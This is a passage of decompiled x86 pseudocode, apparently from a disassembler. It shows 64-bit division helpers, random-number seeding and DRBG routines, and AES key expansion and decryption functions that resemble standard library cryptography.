  {
    v6 >>= 1;
    v7 >>= 1;
  }
  while ( HIDWORD(v6) );
  v8 = v7 / (unsigned int)v6;
  v9 = HIDWORD(a2) * v8;
  v11 = (unsigned int)a2 * (unsigned __int64)v8;
  v10 = __CFADD__(v9, HIDWORD(v11));
  HIDWORD(v11) += v9;
  if ( v10 || v11 > a1 )
    v11 -= a2;
  result = v11 - a1;
  if ( v2 - 1 < 0 )
    return -(__int64)result;
  return result;
}

//----- (004012C0) --------------------------------------------------------
unsigned int __stdcall sub_4012C0(unsigned __int64 a1, __int64 a2)
{
  unsigned __int64 v3; // rtt
  unsigned int v4; // ecx
  unsigned int v5; // ebx
  unsigned __int64 v6; // rax
  char v7; // cf
  unsigned int v8; // esi
  unsigned __int64 v9; // rax

  if ( HIDWORD(a2) )
  {
    v4 = HIDWORD(a2);
    v5 = a2;
    v6 = a1;
    do
    {
      v7 = v4 & 1;
      v4 >>= 1;
      v5 = (v5 >> 1) | (v7 << 31);
      v6 >>= 1;
    }
    while ( v4 );
    v8 = v6 / v5;
    v9 = v8 * (unsigned __int64)(unsigned int)a2;
    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * (unsigned __int64)v8) >> 32, v9 > a1) )
      --v8;
    return v8;
  }
  else
  {
    LODWORD(v3) = a1;
    HIDWORD(v3) = HIDWORD(a1) % (unsigned int)a2;
    return v3 / (unsigned int)a2;
  }
}

//----- (00401330) --------------------------------------------------------
int __cdecl sub_401330(_DWORD *a1)
{
  int v1; // ecx
  int v2; // edx
  int v4; // edi
  _DWORD *v5; // esi
  int v6; // ebx
  char v7[128]; // [esp+0h] [ebp-88h] BYREF
  int v8; // [esp+80h] [ebp-8h]
  int Src; // [esp+84h] [ebp-4h] BYREF

  v1 = 0;
  v2 = a1[28];
  if ( !v2 )
    return -64;
  v4 = 0;
  if ( v2 <= 0 )
  {
LABEL_14:
    v6 = -61;
  }
  else
  {
    v5 = a1 + 29;
    while ( 1 )
    {
      Src = 0;
      if ( v5[4] == 1 )
        v1 = 1;
      v8 = v1;
      v6 = ((int (__cdecl *)(_DWORD, char *, int, int *))*v5)(v5[1], v7, 128, &Src);
      if ( v6 )
        break;
      if ( Src )
      {
        v6 = sub_4013F0(a1, v4, v7, Src);
        if ( v6 )
          return v6;
        v5[2] += Src;
      }
      ++v4;
      v5 += 5;
      if ( v4 >= a1[28] )
      {
        if ( v8 )
          break;
        goto LABEL_14;
      }
      v1 = v8;
    }
  }
  sub_408020(v7, 0x80u);
  return v6;
}

//----- (004013F0) --------------------------------------------------------
int __cdecl sub_4013F0(_DWORD *a1, char a2, char *a3, unsigned int Src)
{
  int v4; // ebx
  int *v5; // edi
  int v6; // esi
  _DWORD *v7; // ecx
  size_t *v8; // eax
  _BYTE v10[32]; // [esp+Ch] [ebp-20h] BYREF

  v4 = Src;
  v5 = (int *)a3;
  if ( Src > 0x20 )
  {
    v6 = sub_407E00(a3, Src, v10, 0);
    if ( v6 )
      goto LABEL_9;
    v5 = (int *)v10;
    v4 = 32;
  }
  v7 = a1;
  LOBYTE(Src) = a2;
  BYTE1(Src) = v4;
  v8 = a1 + 1;
  if ( !*a1 )
  {
    v6 = sub_407E70(a1 + 1, 0);
    if ( v6 )
      goto LABEL_9;
    v8 = a1 + 1;
    v7 = a1;
  }
  *v7 = 1;
  v6 = sub_407F40(v8, (char *)&Src, 2);
  if ( !v6 )
    v6 = sub_407F40(a1 + 1, (char *)v5, v4);
LABEL_9:
  sub_408020(v10, 0x20u);
  return v6;
}
// 4013F0: using guessed type _BYTE var_20[32];

//----- (004014A0) --------------------------------------------------------
void *__cdecl sub_4014A0(_DWORD *a1)
{
  void *result; // eax

  sub_407DC0(a1 + 1);
  a1[28] = 0;
  result = sub_408020(a1 + 29, 0x190u);
  *a1 = 0;
  return result;
}

//----- (004014E0) --------------------------------------------------------
int __cdecl sub_4014E0(_DWORD *a1, void *a2, size_t Size)
{
  int v3; // ecx
  int v6; // esi
  int v7; // esi
  int v8; // edi
  unsigned int *v9; // edx
  unsigned int v10; // eax
  int v11; // ecx
  int v12; // eax
  _DWORD *v13; // ecx
  __int128 Src[2]; // [esp+0h] [ebp-20h] BYREF
  int v15; // [esp+28h] [ebp+8h]

  v3 = 0;
  if ( Size > 0x20 )
    return -60;
  do
  {
    v15 = v3 + 1;
    if ( v3 > 256 )
    {
      v6 = -60;
      goto LABEL_20;
    }
    v6 = sub_401330(a1);
    if ( v6 )
      goto LABEL_20;
    v7 = a1[28];
    v8 = 1;
    if ( v7 <= 0 )
      break;
    v9 = a1 + 31;
    do
    {
      v10 = *v9;
      v9 += 5;
      v11 = 0;
      if ( v10 >= *(v9 - 4) )
        v11 = v8;
      v8 = v11;
      --v7;
    }
    while ( v7 );
    v3 = v15;
  }
  while ( !v8 );
  memset(Src, 0, sizeof(Src));
  v6 = sub_407C00((int)(a1 + 1), Src);
  if ( !v6 )
  {
    sub_407DC0(a1 + 1);
    sub_407DE0(a1 + 1);
    v6 = sub_407E70(a1 + 1, 0);
    if ( !v6 )
    {
      v6 = sub_407F40(a1 + 1, (char *)Src, 32);
      if ( !v6 )
      {
        v12 = sub_407E00((char *)Src, 32, Src, 0);
        v6 = v12;
        if ( !v12 )
        {
          if ( (int)a1[28] > 0 )
          {
            v13 = a1 + 31;
            do
            {
              *v13 = 0;
              v13 += 5;
              ++v12;
            }
            while ( v12 < a1[28] );
          }
          memcpy(a2, Src, Size);
          v6 = 0;
        }
      }
    }
  }
LABEL_20:
  sub_408020(Src, 0x20u);
  return v6;
}

//----- (00401610) --------------------------------------------------------
int __cdecl sub_401610(_DWORD *a1)
{
  int result; // eax
  int v2; // edx
  _DWORD *v3; // ecx

  a1[28] = 0;
  memset(a1 + 29, 0, 0x190u);
  *a1 = 0;
  result = (int)sub_407DE0(a1 + 1);
  v2 = a1[28];
  if ( v2 < 20 )
  {
    v3 = &a1[5 * v2];
    result = 5 * v2;
    v3[29] = sub_407FF0;
    v3[30] = 0;
    v3[32] = 32;
    v3[33] = 1;
    ++a1[28];
  }
  return result;
}

//----- (00401680) --------------------------------------------------------
int __cdecl sub_401680(_OWORD *a1, void *Src, size_t Size)
{
  int v4; // esi
  int i; // eax
  int v6; // eax
  int v7; // ebx
  __int128 v8; // xmm0
  unsigned int v9; // edi
  int v10; // esi
  int k; // eax
  _BYTE *v12; // edx
  int v13; // eax
  _OWORD *v14; // esi
  int j; // edi
  int v16[70]; // [esp+4h] [ebp-31Ch] BYREF
  char v17[416]; // [esp+11Ch] [ebp-204h] BYREF
  unsigned __int8 v18[32]; // [esp+2BCh] [ebp-64h] BYREF
  unsigned __int8 v19[32]; // [esp+2DCh] [ebp-44h] BYREF
  __int128 v20; // [esp+2FCh] [ebp-24h] BYREF
  __int128 v21; // [esp+30Ch] [ebp-14h] BYREF
  int v22; // [esp+31Ch] [ebp-4h]
  size_t Sizea; // [esp+330h] [ebp+10h]

  if ( Size > 0x180 )
    return -56;
  memset(v17, 0, sizeof(v17));
  sub_401D00(v16);
  v17[19] = Size;
  v17[16] = HIBYTE(Size);
  v17[17] = BYTE2(Size);
  v17[18] = BYTE1(Size);
  v17[23] = 48;
  memcpy(&v17[24], Src, Size);
  v4 = Size + 25;
  v17[Size + 24] = 0x80;
  v22 = Size + 25;
  for ( i = 0; i < 32; ++i )
    v18[i] = i;
  v6 = sub_401D20(v16, v18, 256);
  v7 = v6;
  if ( !v6 )
  {
    Sizea = 0;
    while ( 1 )
    {
      v8 = 0i64;
      v9 = v4;
      v21 = 0i64;
      if ( v4 )
        break;
LABEL_16:
      ++v17[3];
      *(_OWORD *)&v19[v6] = v8;
      v6 += 16;
      Sizea = v6;
      if ( v6 >= 48 )
      {
        v7 = sub_401D20(v16, v19, 256);
        if ( !v7 )
        {
          v14 = a1;
          for ( j = 0; j < 48; j += 16 )
          {
            v7 = sub_401CB0(v16, 1, (unsigned __int8 *)&v20, (int)&v20);
            if ( v7 )
              break;
            *v14++ = v20;
          }
        }
        goto LABEL_21;
      }
    }
    v10 = -496;
    while ( 1 )
    {
      for ( k = 0; k < 16; ++k )
      {
        v12 = (char *)&v21 + k;
        *v12 ^= v12[v10];
      }
      v10 += 16;
      v13 = v9;
      if ( v9 >= 0x10 )
        v13 = 16;
      v9 -= v13;
      v7 = sub_401CB0(v16, 1, (unsigned __int8 *)&v21, (int)&v21);
      if ( v7 )
        break;
      if ( !v9 )
      {
        v8 = v21;
        v6 = Sizea;
        v4 = v22;
        goto LABEL_16;
      }
    }
  }
LABEL_21:
  sub_401CE0(v16);
  sub_408020(v17, 0x1A0u);
  sub_408020(v19, 0x30u);
  sub_408020(v18, 0x20u);
  sub_408020(&v21, 0x10u);
  if ( v7 )
    sub_408020(a1, 0x30u);
  return v7;
}
// 401680: using guessed type int var_31C[70];
// 401680: using guessed type unsigned __int8 var_64[32];
// 401680: using guessed type unsigned __int8 var_44[32];

//----- (00401870) --------------------------------------------------------
int __cdecl sub_401870(int a1, int a2)
{
  __int128 *v2; // esi
  int v3; // edx
  int v4; // ebx
  _BYTE *v5; // eax
  int v7; // esi
  int i; // ecx
  __m128i *v9; // eax
  __int128 v11[3]; // [esp+Ch] [ebp-38h] BYREF
  _DWORD *v12; // [esp+3Ch] [ebp-8h]
  __int128 *v13; // [esp+40h] [ebp-4h]

  v2 = v11;
  v13 = v11;
  memset(v11, 0, sizeof(v11));
  v3 = a1;
  v4 = 0;
  v5 = (_BYTE *)(a1 + 15);
  v12 = (_DWORD *)(a1 + 32);
  while ( 1 )
  {
    do
    {
      if ( (*v5)++ != 0xFF )
        break;
      --v5;
    }
    while ( (int)&v5[1 - a1] > 0 );
    v7 = sub_401CB0((int *)(v3 + 32), 1, (unsigned __int8 *)v3, (int)v2);
    if ( v7 )
      break;
    v4 += 16;
    v3 = a1;
    v2 = ++v13;
    v5 = (_BYTE *)(a1 + 15);
    if ( v4 >= 48 )
    {
      for ( i = 0; i < 3; ++i )
      {
        v9 = (__m128i *)&v11[i];
        *v9 = _mm_xor_si128(*(__m128i *)((char *)v9 + a2 - (_DWORD)v11), *v9);
      }
      v7 = sub_401D20(v12, (unsigned __int8 *)v11, 256);
      if ( !v7 )
        *(_OWORD *)a1 = v11[2];
      break;
    }
  }
  sub_408020(v11, 0x30u);
  return v7;
}

//----- (00401940) --------------------------------------------------------
void *__cdecl sub_401940(char *a1)
{
  void *result; // eax

  if ( a1 )
  {
    sub_401CE0(a1 + 32);
    return sub_408020(a1, 0x140u);
  }
  return result;
}

//----- (00401970) --------------------------------------------------------
void *__cdecl sub_401970(void *a1)
{
  return memset(a1, 0, 0x140u);
}

//----- (00401990) --------------------------------------------------------
int __cdecl sub_401990(int a1, char *a2, unsigned int a3)
{
  size_t v3; // esi
  int result; // eax
  _BYTE *v5; // eax
  int *v6; // edx
  bool v7; // zf
  char v8[48]; // [esp+4h] [ebp-40h] BYREF
  char Src[16]; // [esp+34h] [ebp-10h] BYREF

  v3 = a3;
  if ( a3 > 0x400 )
    return -54;
  memset(v8, 0, sizeof(v8));
  if ( *(_DWORD *)(a1 + 16) <= *(_DWORD *)(a1 + 28) && !*(_DWORD *)(a1 + 20) || (result = sub_401A80(a1, 0, 0)) == 0 )
  {
    if ( a3 )
    {
      v5 = (_BYTE *)(a1 + 15);
      v6 = (int *)(a1 + 32);
      while ( 1 )
      {
        do
        {
          v7 = (*v5)++ == 0xFF;
          if ( !v7 )
            break;
          --v5;
        }
        while ( (int)&v5[1 - a1] > 0 );
        if ( sub_401CB0(v6, 1, (unsigned __int8 *)a1, (int)Src) )
          break;
        if ( a3 > 0x10 )
          v3 = 16;
        memcpy(a2, Src, v3);
        a2 += v3;
        v5 = (_BYTE *)(a1 + 15);
        v6 = (int *)(a1 + 32);
        v7 = a3 == v3;
        a3 -= v3;
        v3 = a3;
        if ( v7 )
          goto LABEL_14;
      }
    }
    else
    {
LABEL_14:
      if ( !sub_401870(a1, (int)v8) )
        ++*(_DWORD *)(a1 + 16);
    }
    sub_408020(v8, 0x30u);
    sub_408020(Src, 0x10u);
    return 0;
  }
  return result;
}

//----- (00401A80) --------------------------------------------------------
int __cdecl sub_401A80(int a1, void *Src, size_t Size)
{
  unsigned int v3; // ebx
  size_t v5; // ebx
  int v6; // edi
  _OWORD v7[24]; // [esp+Ch] [ebp-180h] BYREF

  v3 = *(_DWORD *)(a1 + 24);
  if ( v3 > 0x180 || Size > 384 - v3 )
    return -56;
  memset(v7, 0, sizeof(v7));
  if ( (*(int (__cdecl **)(_DWORD, _OWORD *, unsigned int))(a1 + 312))(*(_DWORD *)(a1 + 316), v7, v3) )
    return -52;
  v5 = *(_DWORD *)(a1 + 24);
  if ( Src && Size )
  {
    memcpy((char *)v7 + v5, Src, Size);
    v5 += Size;
  }
  v6 = sub_401680(v7, v7, v5);
  if ( !v6 )
  {
    v6 = sub_401870(a1, (int)v7);
    if ( !v6 )
      *(_DWORD *)(a1 + 16) = 1;
  }
  sub_408020(v7, 0x180u);
  return v6;
}
// 401A80: using guessed type _OWORD var_180[24];

//----- (00401B70) --------------------------------------------------------
int __cdecl sub_401B70(_DWORD *a1, int a2, int a3, void *Src, size_t Size)
{
  int result; // eax
  __int128 v6[2]; // [esp+8h] [ebp-20h] BYREF

  memset(v6, 0, sizeof(v6));
  sub_401D00(a1 + 8);
  a1[78] = a2;
  a1[79] = a3;
  a1[6] = 32;
  a1[7] = 10000;
  result = sub_401D20(a1 + 8, (unsigned __int8 *)v6, 256);
  if ( !result )
    return sub_401A80((int)a1, Src, Size);
  return result;
}

//----- (00401BE0) --------------------------------------------------------
int __cdecl sub_401BE0(int *a1, int a2, int a3, __m128i *a4, __m128i *a5, unsigned __int8 *a6)
{
  __m128i *v6; // ecx
  unsigned __int8 *v7; // esi
  __m128i *v8; // edi
  char *v9; // ebx
  unsigned int v10; // edx
  int *v11; // edx
  __m128i *v12; // eax
  int v13; // edx
  __int8 v14; // cl
  __m128i v15; // xmm0
  bool v16; // zf
  unsigned int v18; // [esp+0h] [ebp-4h]
  int v19; // [esp+14h] [ebp+10h]

  if ( a3 )
  {
    v6 = a4;
    v7 = a6;
    v8 = a5;
    v9 = (char *)((char *)a4 - (char *)a5);
    v10 = ((unsigned int)(a3 - 1) >> 4) + 1;
    v19 = (char *)a4 - (char *)a5;
    v18 = v10;
    v11 = a1;
    do
    {
      if ( (v7 > &v8->m128i_u8[15] || v7 + 15 < (unsigned __int8 *)v8)
        && (v7 > &v6->m128i_u8[15] || v7 + 15 < (unsigned __int8 *)v6) )
      {
        *(__m128i *)v7 = _mm_xor_si128(*v8, *v6);
      }
      else
      {
        v12 = v8;
        v13 = 16;
        do
        {
          v14 = v12->m128i_i8[v19];
          v12 = (__m128i *)((char *)v12 + 1);
          v12->m128i_i8[v7 - (unsigned __int8 *)v8 - 1] = v12[-1].m128i_i8[15] ^ v14;
          --v13;
        }
        while ( v13 );
        v7 = a6;
        v9 = (char *)v19;
        v11 = a1;
      }
      if ( a2 == 1 )
        sub_4027B0(v11, v7, (int)v7);
      else
        sub_402220(v11, v7, (int)v7);
      v15 = *(__m128i *)v7;
      v6 = a4;
      v7 += 16;
      v11 = a1;
      v9 -= 16;
      a6 = v7;
      ++v8;
      v19 = (int)v9;
      v16 = v18-- == 1;
      *a4 = v15;
    }
    while ( !v16 );
  }
  return 0;
}

//----- (00401CB0) --------------------------------------------------------
int __cdecl sub_401CB0(int *a1, int a2, unsigned __int8 *a3, int a4)
{
  if ( a2 == 1 )
    return sub_4027B0(a1, a3, a4);
  else
    return sub_402220(a1, a3, a4);
}

//----- (00401CE0) --------------------------------------------------------
void *__cdecl sub_401CE0(void *a1)
{
  void *result; // eax

  result = a1;
  if ( a1 )
    return sub_408020(a1, 0x118u);
  return result;
}

//----- (00401D00) --------------------------------------------------------
void *__cdecl sub_401D00(void *a1)
{
  return memset(a1, 0, 0x118u);
}

//----- (00401D20) --------------------------------------------------------
int __cdecl sub_401D20(_DWORD *a1, unsigned __int8 *a2, int a3)
{
  _DWORD *v4; // esi
  int v6; // edi
  unsigned int v7; // ebx
  int v8; // esi
  int v9; // edx
  int v10; // ecx
  int v11; // edx
  unsigned int v12; // ebx
  int v13; // edi
  int v14; // esi
  int v15; // ecx
  unsigned int v16; // edx
  int v17; // ebx
  int v18; // edi
  int v19; // esi
  int v20; // ebx
  unsigned int v21; // edx
  int v22; // edx
  int v23; // esi
  int v24; // ebx
  int v25; // ecx
  int v26; // edx
  int v27; // edi
  int v28; // esi
  int v29; // ecx
  int v30; // edx
  int v31; // ebx
  int v32; // edi
  int v33; // esi
  int v34; // ecx
  int v35; // edx
  int v36; // ebx
  int v37; // ecx
  int v38; // edi
  unsigned int v39; // [esp+4h] [ebp-8h]
  unsigned int v40; // [esp+4h] [ebp-8h]
  int v41; // [esp+8h] [ebp-4h]
  int v42; // [esp+8h] [ebp-4h]
  int v43; // [esp+8h] [ebp-4h]
  _DWORD *v44; // [esp+1Ch] [ebp+10h]

  switch ( a3 )
  {
    case 128:
      v4 = a1;
      *a1 = 10;
      break;
    case 192:
      v4 = a1;
      *a1 = 12;
      break;
    case 256:
      v4 = a1;
      *a1 = 14;
      break;
    default:
      return -32;
  }
  v4[1] = v4 + 2;
  v44 = v4 + 2;
  v6 = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);
  v4[2] = v6;
  v4[3] = a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8);
  v4[4] = a2[8] | ((a2[9] | (*((unsigned __int16 *)a2 + 5) << 8)) << 8);
  v7 = a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8);
  v4[5] = v7;
  if ( *v4 == 10 )
  {
    v8 = v6 ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v7)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v7)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v7)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v7] << 8)) << 8)) << 8) ^ 1;
    v9 = v44[2];
    v10 = v8 ^ v44[1];
    v44[4] = v8;
    v11 = v10 ^ v9;
    v44[5] = v10;
    v12 = v11 ^ v7;
    v44[7] = v12;
    v44[6] = v11;
    v13 = v8 ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v12)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v12)] ^ ((((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v12] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v12)]) << 8)) << 8) ^ 2;
    v14 = v10 ^ v13;
    v44[8] = v13;
    v44[9] = v10 ^ v13;
    v15 = v11 ^ v14;
    v44[10] = v11 ^ v14;
    v16 = v12 ^ v11 ^ v14;
    v44[11] = v16;
    v17 = v13 ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v16)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v16)] ^ ((((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v16] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v16)]) << 8)) << 8) ^ 4;
    v44[12] = v17;
    v18 = v14 ^ v17;
    v44[13] = v14 ^ v17;
    v19 = v15 ^ v14 ^ v17;
    v44[14] = v19;
    v44[15] = v16 ^ v19;
    v41 = v17 ^ (unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int16)(v16 ^ v19) >> 8] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)((v16 ^ v19) >> 16)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[(v16 ^ v19) >> 24] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)(v16 ^ v19)] << 8)) << 8)) << 8) ^ 8;
    v44[16] = v41;
    v20 = v18 ^ v41;
    v44[17] = v18 ^ v41;
    v44[18] = v19 ^ v18 ^ v41;
    v21 = v16 ^ v19 ^ v19 ^ v18 ^ v41;
    v44[19] = v21;
    v39 = v21;
    v42 = v41 ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v21)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v21)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v21)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v21] << 8)) << 8)) << 8) ^ 0x10;
    v22 = v20 ^ v42;
    v44[20] = v42;
    v44[21] = v20 ^ v42;
    v23 = v19 ^ v20 ^ v20 ^ v42;
    v44[22] = v23;
    v44[23] = v39 ^ v23;
    v40 = v39 ^ v23;
    v24 = v42 ^ (unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 93)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v40)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v40)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v40] << 8)) << 8)) << 8) ^ 0x20;
    v44[24] = v24;
    v25 = v22 ^ v24;
    v44[25] = v22 ^ v24;
    v26 = v23 ^ v22 ^ v24;
    v44[26] = v26;
    v44[27] = v40 ^ v26;
    v27 = v24 ^ (unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 109)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 110)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 111)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)(v40 ^ v26)] << 8)) << 8)) << 8) ^ 0x40;
    v28 = v25 ^ v27;
    v44[28] = v27;
    v44[29] = v25 ^ v27;
    v29 = v26 ^ v28;
    v44[30] = v26 ^ v28;
    v30 = v40 ^ v26 ^ v26 ^ v28;
    v44[31] = v30;
    v31 = v27 ^ (unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 125)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 126)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 127)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v30] << 8)) << 8)) << 8) ^ 0x80;
    v44[32] = v31;
    v32 = v28 ^ v31;
    v44[33] = v28 ^ v31;
    v33 = v29 ^ v28 ^ v31;
    v44[34] = v33;
    v34 = v30 ^ v33;
    v44[35] = v30 ^ v33;
    v43 = v31 ^ (unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 141)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 142)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 143)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)(v30 ^ v33)] << 8)) << 8)) << 8) ^ 0x1B;
    v44[36] = v43;
    v35 = v33 ^ v32 ^ v43;
    v44[37] = v32 ^ v43;
    v36 = v34 ^ v35;
    v44[39] = v34 ^ v35;
    v44[38] = v35;
    v37 = v43 ^ (unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 157)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 158)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 159)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)(v34 ^ v35)] << 8)) << 8)) << 8) ^ 0x36;
    v44[40] = v37;
    v44[41] = v37 ^ v32 ^ v43;
    v38 = v35 ^ v37 ^ v32 ^ v43;
    v44[42] = v38;
    v44[43] = v36 ^ v38;
  }
  return 0;
}

//----- (00402220) --------------------------------------------------------
int __cdecl sub_402220(int *a1, unsigned __int8 *a2, int a3)
{
  _DWORD *v4; // eax
  int v5; // ebx
  unsigned int v6; // edi
  int v7; // edx
  _DWORD *v8; // eax
  unsigned int v9; // ebx
  int v10; // ecx
  int v11; // edx
  int v12; // ebx
  int v13; // edx
  unsigned __int8 v14; // ah
  int result; // eax
  int i; // [esp+Ch] [ebp-18h]
  unsigned int v17; // [esp+Ch] [ebp-18h]
  unsigned int v18; // [esp+10h] [ebp-14h]
  unsigned int v19; // [esp+14h] [ebp-10h]
  unsigned int v20; // [esp+14h] [ebp-10h]
  unsigned int v21; // [esp+18h] [ebp-Ch]
  unsigned int v22; // [esp+18h] [ebp-Ch]
  unsigned int v23; // [esp+1Ch] [ebp-8h]
  unsigned int v24; // [esp+20h] [ebp-4h]
  unsigned int v25; // [esp+20h] [ebp-4h]
  unsigned int v26; // [esp+2Ch] [ebp+8h]
  int v27; // [esp+2Ch] [ebp+8h]
  unsigned int v28; // [esp+30h] [ebp+Ch]
  int v29; // [esp+30h] [ebp+Ch]

  v4 = (_DWORD *)a1[1];
  v26 = v4[1] ^ (a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8));
  v5 = *v4 ^ (*a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8));
  v23 = v5;
  v6 = v4[2] ^ (a2[8] | ((a2[9] | ((a2[10] | (a2[11] << 8)) << 8)) << 8));
  v24 = v6;
  v7 = v4[3] ^ (a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8));
  v8 = v4 + 4;
  v28 = v7;
  for ( i = (*a1 >> 1) - 1; i > 0; --i )
  {
    v21 = *v8 ^ dword_416570[(unsigned __int8)v5] ^ dword_417170[HIBYTE(v26)] ^ dword_416D70[BYTE2(v6)] ^ dword_416970[BYTE1(v7)];
    v19 = v8[1] ^ dword_416570[(unsigned __int8)v26] ^ dword_417170[HIBYTE(v24)] ^ dword_416970[BYTE1(v5)] ^ dword_416D70[BYTE2(v28)];
    v18 = v8[2] ^ dword_416570[(unsigned __int8)v24] ^ dword_417170[HIBYTE(v28)] ^ dword_416D70[BYTE2(v5)] ^ dword_416970[BYTE1(v26)];
    v9 = v8[3] ^ dword_416570[(unsigned __int8)v28] ^ dword_417170[HIBYTE(v23)] ^ dword_416D70[BYTE2(v26)] ^ dword_416970[BYTE1(v24)];
    v23 = v8[4] ^ dword_416570[(unsigned __int8)v21] ^ dword_417170[HIBYTE(v19)] ^ dword_416D70[BYTE2(v18)] ^ dword_416970[(unsigned __int8)((unsigned __int16)(*((_WORD *)v8 + 6) ^ LOWORD(dword_416570[(unsigned __int8)v28]) ^ LOWORD(dword_417170[HIBYTE(v23)]) ^ LOWORD(dword_416D70[BYTE2(v26)]) ^ LOWORD(dword_416970[BYTE1(v24)])) >> 8)];
    v26 = v8[5] ^ dword_416570[(unsigned __int8)v19] ^ dword_417170[HIBYTE(v18)] ^ dword_416970[BYTE1(v21)] ^ dword_416D70[BYTE2(v9)];
    v24 = v8[6] ^ dword_416570[(unsigned __int8)v18] ^ dword_417170[HIBYTE(v9)] ^ dword_416D70[BYTE2(v21)] ^ dword_416970[BYTE1(v19)];
    v6 = v24;
    v10 = (unsigned __int8)v9;
    v5 = v23;
    v7 = v8[7] ^ dword_416570[v10] ^ dword_417170[HIBYTE(v21)] ^ dword_416D70[BYTE2(v19)] ^ dword_416970[BYTE1(v18)];
    v8 += 8;
    v28 = v7;
  }
  v22 = *v8 ^ dword_416570[(unsigned __int8)v5] ^ dword_417170[HIBYTE(v26)] ^ dword_416D70[BYTE2(v6)] ^ dword_416970[BYTE1(v7)];
  v20 = v8[1] ^ dword_416570[(unsigned __int8)v26] ^ dword_417170[HIBYTE(v6)] ^ dword_416970[BYTE1(v5)] ^ dword_416D70[BYTE2(v28)];
  v11 = dword_416970[BYTE1(v24)];
  v25 = v8[2] ^ dword_416570[(unsigned __int8)v24] ^ dword_417170[HIBYTE(v28)] ^ dword_416D70[BYTE2(v5)] ^ dword_416970[BYTE1(v26)];
  v17 = v8[3] ^ dword_416570[(unsigned __int8)v28] ^ dword_417170[HIBYTE(v23)] ^ dword_416D70[BYTE2(v26)] ^ v11;
  v27 = v8[4] ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[(unsigned __int8)v22] ^ (((unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE1(v17)] ^ ((((unsigned __int8)RijnDael_AES_inv_LONG_416470[HIBYTE(v20)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE2(v25)]) << 8)) << 8);
  v29 = v8[5] ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[(unsigned __int8)v20] ^ (((unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE1(v22)] ^ ((((unsigned __int8)RijnDael_AES_inv_LONG_416470[HIBYTE(v25)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE2(v17)]) << 8)) << 8);
  v12 = v8[6] ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[(unsigned __int8)v25] ^ (((unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE1(v20)] ^ ((((unsigned __int8)RijnDael_AES_inv_LONG_416470[HIBYTE(v17)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE2(v22)]) << 8)) << 8);
  v13 = v8[7] ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[(unsigned __int8)v17] ^ (((unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE1(v25)] ^ ((((unsigned __int8)RijnDael_AES_inv_LONG_416470[HIBYTE(v22)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE2(v20)]) << 8)) << 8);
